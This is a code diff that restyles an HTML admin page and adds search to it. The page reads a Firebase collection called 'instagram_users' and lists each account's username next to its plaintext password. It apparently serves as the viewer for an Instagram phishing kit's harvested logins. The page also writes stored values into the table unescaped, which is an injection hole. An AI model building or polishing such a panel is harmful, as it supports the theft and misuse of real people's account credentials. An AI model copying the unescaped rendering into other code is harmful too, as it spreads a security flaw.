@@ -2,56 +2,130 @@
 
 <html>
 <head>
-  <title>Admin Panel - Instagram Users</title>
+  <title>🔥 Admin Panel - Zoya</title>
+
   <style>
     body {
-      font-family: Arial;
-      background: #111;
+      margin: 0;
+      font-family: 'Segoe UI', sans-serif;
+      background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
       color: #fff;
-      padding: 20px;
     }
+
+    h2 {
+      text-align: center;
+      margin-top: 20px;
+      font-weight: 600;
+      letter-spacing: 1px;
+    }
+
+    .container {
+      width: 90%;
+      margin: 30px auto;
+      backdrop-filter: blur(10px);
+      background: rgba(255, 255, 255, 0.05);
+      border-radius: 15px;
+      padding: 20px;
+      box-shadow: 0 0 20px rgba(0,0,0,0.4);
+    }
+
     table {
       width: 100%;
       border-collapse: collapse;
-      margin-top: 20px;
+      overflow: hidden;
+      border-radius: 10px;
     }
-    th, td {
-      border: 1px solid #444;
-      padding: 10px;
-      text-align: center;
-    }
+
     th {
-      background: #222;
+      background: rgba(0,0,0,0.5);
+      padding: 12px;
+      text-transform: uppercase;
+      font-size: 14px;
+      letter-spacing: 1px;
     }
-    button {
-      padding: 6px 12px;
+
+    td {
+      padding: 12px;
+      text-align: center;
+      border-bottom: 1px solid rgba(255,255,255,0.1);
+    }
+
+    tr:hover {
+      background: rgba(255,255,255,0.05);
+      transition: 0.3s;
+    }
+
+    .btn-delete {
+      background: linear-gradient(45deg, #ff416c, #ff4b2b);
       border: none;
-      background: red;
+      padding: 6px 12px;
       color: white;
+      border-radius: 20px;
       cursor: pointer;
-      border-radius: 5px;
+      transition: 0.3s;
     }
-    button:hover {
-      background: darkred;
+
+    .btn-delete:hover {
+      transform: scale(1.1);
+      box-shadow: 0 0 10px #ff4b2b;
     }
+
+    .status {
+      padding: 4px 10px;
+      border-radius: 10px;
+      font-size: 12px;
+    }
+
+    .pending {
+      background: orange;
+    }
+
+    .verified {
+      background: limegreen;
+    }
+
+    .top-bar {
+      display: flex;
+      justify-content: space-between;
+      margin-bottom: 10px;
+    }
+
+    input {
+      padding: 8px;
+      border-radius: 8px;
+      border: none;
+      outline: none;
+      width: 200px;
+    }
+
   </style>
+
 </head>
+
 <body>
 
-<h2>📊 Instagram Users Admin Panel</h2>
+<h2>🚀 Zoya Admin Panel</h2>
 
-<table id="userTable">
-  <thead>
-    <tr>
-      <th>Username</th>
-      <th>Password</th>
-      <th>Status</th>
-      <th>Verified</th>
-      <th>Action</th>
-    </tr>
-  </thead>
-  <tbody></tbody>
-</table>
+<div class="container">
+
+  <div class="top-bar">
+    <input type="text" id="search" placeholder="Search username..." onkeyup="filterUsers()">
+  </div>
+
+  <table id="userTable">
+    <thead>
+      <tr>
+        <th>Username</th>
+        <th>Password</th>
+        <th>Status</th>
+        <th>Verified</th>
+        <th>Action</th>
+      </tr>
+    </thead>
+    <tbody></tbody>
+  </table>
+
+</div>
 
 <script type="module">
 import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
@@ -71,28 +145,29 @@ const db = getFirestore(app);
 
 const tableBody = document.querySelector("#userTable tbody");
 
-// Fetch Data
 async function loadUsers() {
   tableBody.innerHTML = "";
-  const querySnapshot = await getDocs(collection(db, "instagram_users"));
+  const snapshot = await getDocs(collection(db, "instagram_users"));
 
-  querySnapshot.forEach((docSnap) => {
+  snapshot.forEach((docSnap) => {
     const data = docSnap.data();
+
+    const statusClass = data.status === "pending" ? "pending" : "verified";
+
     const row = document.createElement("tr");
 
     row.innerHTML = `
       <td>${data.username}</td>
       <td>${data.password}</td>
-      <td>${data.status}</td>
+      <td><span class="status ${statusClass}">${data.status}</span></td>
       <td>${data.verified}</td>
-      <td><button onclick="deleteUser('${docSnap.id}')">Delete</button></td>
+      <td><button class="btn-delete" onclick="deleteUser('${docSnap.id}')">Delete</button></td>
     `;
 
     tableBody.appendChild(row);
   });
 }
 
-// Delete Function
 window.deleteUser = async (id) => {
   if (confirm("Delete this user?")) {
     await deleteDoc(doc(db, "instagram_users", id));
@@ -100,11 +175,19 @@ window.deleteUser = async (id) => {
   }
 };
 
-// Load on start
+window.filterUsers = () => {
+  const input = document.getElementById("search").value.toLowerCase();
+  const rows = document.querySelectorAll("#userTable tbody tr");
+
+  rows.forEach(row => {
+    const username = row.children[0].textContent.toLowerCase();
+    row.style.display = username.includes(input) ? "" : "none";
+  });
+};
+
 loadUsers();
 
 </script>
 
 </body>
 </html>
-
